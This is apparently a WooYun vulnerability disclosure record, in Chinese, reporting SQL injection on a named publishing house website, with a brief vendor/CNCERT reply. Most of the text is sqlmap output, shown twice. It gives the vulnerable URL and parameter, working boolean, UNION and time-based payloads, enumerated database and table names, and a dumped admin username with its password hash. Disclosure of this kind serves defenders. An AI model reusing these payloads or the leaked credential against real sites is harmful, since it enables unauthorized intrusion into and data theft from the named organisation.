wybug_title: 某人民出版社MYSQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-12-10：	细节已通知厂商并且等待厂商处理中									2014-12-14：	厂商已经确认，细节仅向厂商公开									2014-12-24：	细节向核心白帽子及相关领域专家公开									2015-01-03：	细节向普通白帽子公开									2015-01-13：	细节向实习白帽子公开									2015-01-24：	细节向公众公开  简要描述： 某人民出版社MYSQL注入漏洞 详细说明：  注入地址：http://www.hbpp.com.cn/about.php?typeid=7
sqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Place: GETParameter: typeid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: typeid=7 AND 4703=4703    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: typeid=-4342 UNION ALL SELECT NULL,NULL,CONCAT(0x71656c7171,0x7a5864475774786a724a,0x7169747171),NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: typeid=7 AND SLEEP(5)---[11:41:42] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5.0.11[11:41:42] [INFO] fetching database names[11:41:56] [INFO] the SQL query used returns 2 entries[11:41:56] [INFO] retrieved: "information_schema"[11:41:56] [INFO] retrieved: "peopledata"available databases [2]:[*] information_schema[*] peopledata+------------------+| ceo_admin        || ceo_link         || ceo_list         || ceo_list_details || ceo_mboard       || ceo_type         || ceo_user         || web_basic_info   |+------------------+Database: peopledataTable: ceo_admin[1 entry]+-----------+----------------------------------+| user_name | user_pass                        |+-----------+----------------------------------+| people    | aa4d2efb2b165199a83f9f619bc407d6 |+-----------+----------------------------------+
   漏洞证明：  注入地址：http://www.hbpp.com.cn/about.php?typeid=7
sqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Place: GETParameter: typeid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: typeid=7 AND 4703=4703    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: typeid=-4342 UNION ALL SELECT NULL,NULL,CONCAT(0x71656c7171,0x7a5864475774786a724a,0x7169747171),NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: typeid=7 AND SLEEP(5)---[11:41:42] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL 5.0.11[11:41:42] [INFO] fetching database names[11:41:56] [INFO] the SQL query used returns 2 entries[11:41:56] [INFO] retrieved: "information_schema"[11:41:56] [INFO] retrieved: "peopledata"available databases [2]:[*] information_schema[*] peopledata+------------------+| ceo_admin        || ceo_link         || ceo_list         || ceo_list_details || ceo_mboard       || ceo_type         || ceo_user         || web_basic_info   |+------------------+Database: peopledataTable: ceo_admin[1 entry]+-----------+----------------------------------+| user_name | user_pass                        |+-----------+----------------------------------+| people    | aa4d2efb2b165199a83f9f619bc407d6 |+-----------+----------------------------------+
   修复方案：  过滤   版权声明：转载请注明来源 CTAA@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-12-14 12:25 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖北分中心，由其后续协调网站管理单位处置 最新状态： 暂无
